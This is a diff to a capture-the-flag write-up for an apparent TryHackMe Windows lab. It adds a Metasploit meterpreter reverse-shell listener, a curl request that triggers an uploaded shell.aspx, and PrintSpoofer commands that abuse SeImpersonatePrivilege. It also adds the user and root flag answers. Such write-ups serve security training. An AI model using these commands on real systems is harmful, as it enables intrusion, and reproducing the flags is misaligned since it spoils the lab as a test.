@@ -93,7 +93,7 @@ Machine may take up to 5 minutes for all services to start.
 * Set listener on attacker machine
 
 	```
-	nc -nvlp 8888
+	msfconsole -q -x "use exploit/multi/handler; set LHOST 10.17.127.223; set LPORT 8888; set PAYLOAD windows/meterpreter/reverse_tcp; exploit"
 	```
 	
 	![listener](./images/listener.png)
@@ -101,11 +101,63 @@ Machine may take up to 5 minutes for all services to start.
 * Access the payload to get reverse shell
 
 	```
-	curl http://10.10.131.206:49663/nt4wrksv/shell.aspx
+	curl http://10.10.234.131:49663/nt4wrksv/shell.aspx
 	```
+
+	![curl](./images/curl.png)
+
+	![shell](./images/shell.png)
+
+* Get the user flag
+
+	![user](./images/user.png)
+
+* Run `getprivs` to check our privileges
+
+	![getprivs](./images/getprivs.png)
+
+	 We are granted with **SeImpersonatePrivilege**
+
+* Download **PrintSpoofer.exe** for exploit token **SeImpersonatePrivilege**
+
+	```
+	https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
+	```
+
+	![download](./images/download.png)
+
+* Upload **PrintSpoofer.exe** on targer machine
+
+	```
+	cd "C:\inetpub\wwwroot\nt4wrksv"
+	upload PrintSpoofer.exe
+	```
+
+	![printspoofer](./images/printspoofer.png)
+
+* Run `cmd.exe` and run **PrintSpoofer.exe**
+
+	```
+	execute -f cmd.exe -i -H
+	PrintSpoofer.exe -i -c cmd.exe
+	```
+
+	![cmd](./images/cmd.png)
+
+* Get root file
+
+	![root](./images/root.png)
 
 ### Answer the questions below
 
 * User Flag
 
+	`THM{fdk4ka34vk346ksxfr21tg789ktf45}`
+
+	![user](./images/user.png)
+
 * Root Flag
+
+	`THM{1fk5kf469devly1gl320zafgl345pv}`
+
+	![root](./images/root.png) 
